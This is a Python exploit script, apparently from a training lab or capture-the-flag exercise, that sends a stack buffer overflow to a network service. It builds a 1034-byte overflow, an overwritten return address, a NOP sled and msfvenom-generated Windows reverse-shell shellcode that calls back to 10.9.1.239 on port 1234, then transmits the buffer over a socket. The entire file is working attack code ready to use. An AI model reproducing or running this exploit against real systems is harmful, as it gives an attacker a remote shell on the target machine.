#!/usr/bin/env python3


import socket
import os

from CONFIG import ip,port,prefix


offset = 1034
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
overflow = "A" * offset

# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.239 LPORT=1234 EXITFUNC=thread -b "\x07\x2e\xa0"  -f c

payload = (
"\xd9\xeb\xd9\x74\x24\xf4\xba\xbf\xa2\x4d\x30\x5f\x31\xc9\xb1"
"\x52\x31\x57\x17\x03\x57\x17\x83\x50\x5e\xaf\xc5\x52\x77\xb2"
"\x26\xaa\x88\xd3\xaf\x4f\xb9\xd3\xd4\x04\xea\xe3\x9f\x48\x07"
"\x8f\xf2\x78\x9c\xfd\xda\x8f\x15\x4b\x3d\xbe\xa6\xe0\x7d\xa1"
"\x24\xfb\x51\x01\x14\x34\xa4\x40\x51\x29\x45\x10\x0a\x25\xf8"
"\x84\x3f\x73\xc1\x2f\x73\x95\x41\xcc\xc4\x94\x60\x43\x5e\xcf"
"\xa2\x62\xb3\x7b\xeb\x7c\xd0\x46\xa5\xf7\x22\x3c\x34\xd1\x7a"
"\xbd\x9b\x1c\xb3\x4c\xe5\x59\x74\xaf\x90\x93\x86\x52\xa3\x60"
"\xf4\x88\x26\x72\x5e\x5a\x90\x5e\x5e\x8f\x47\x15\x6c\x64\x03"
"\x71\x71\x7b\xc0\x0a\x8d\xf0\xe7\xdc\x07\x42\xcc\xf8\x4c\x10"
"\x6d\x59\x29\xf7\x92\xb9\x92\xa8\x36\xb2\x3f\xbc\x4a\x99\x57"
"\x71\x67\x21\xa8\x1d\xf0\x52\x9a\x82\xaa\xfc\x96\x4b\x75\xfb"
"\xd9\x61\xc1\x93\x27\x8a\x32\xba\xe3\xde\x62\xd4\xc2\x5e\xe9"
"\x24\xea\x8a\xbe\x74\x44\x65\x7f\x24\x24\xd5\x17\x2e\xab\x0a"
"\x07\x51\x61\x23\xa2\xa8\xe2\x46\x3a\xb3\x1d\x3e\x3e\xb3\xe5"
"\x6d\xb7\x55\x8f\x81\x9e\xce\x38\x3b\xbb\x84\xd9\xc4\x11\xe1"
"\xda\x4f\x96\x16\x94\xa7\xd3\x04\x41\x48\xae\x76\xc4\x57\x04"
"\x1e\x8a\xca\xc3\xde\xc5\xf6\x5b\x89\x82\xc9\x95\x5f\x3f\x73"
"\x0c\x7d\xc2\xe5\x77\xc5\x19\xd6\x76\xc4\xec\x62\x5d\xd6\x28"
"\x6a\xd9\x82\xe4\x3d\xb7\x7c\x43\x94\x79\xd6\x1d\x4b\xd0\xbe"
"\xd8\xa7\xe3\xb8\xe4\xed\x95\x24\x54\x58\xe0\x5b\x59\x0c\xe4"
"\x24\x87\xac\x0b\xff\x03\xcc\xe9\xd5\x79\x65\xb4\xbc\xc3\xe8"
"\x47\x6b\x07\x15\xc4\x99\xf8\xe2\xd4\xe8\xfd\xaf\x52\x01\x8c"
"\xa0\x36\x25\x23\xc0\x12"
)




postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
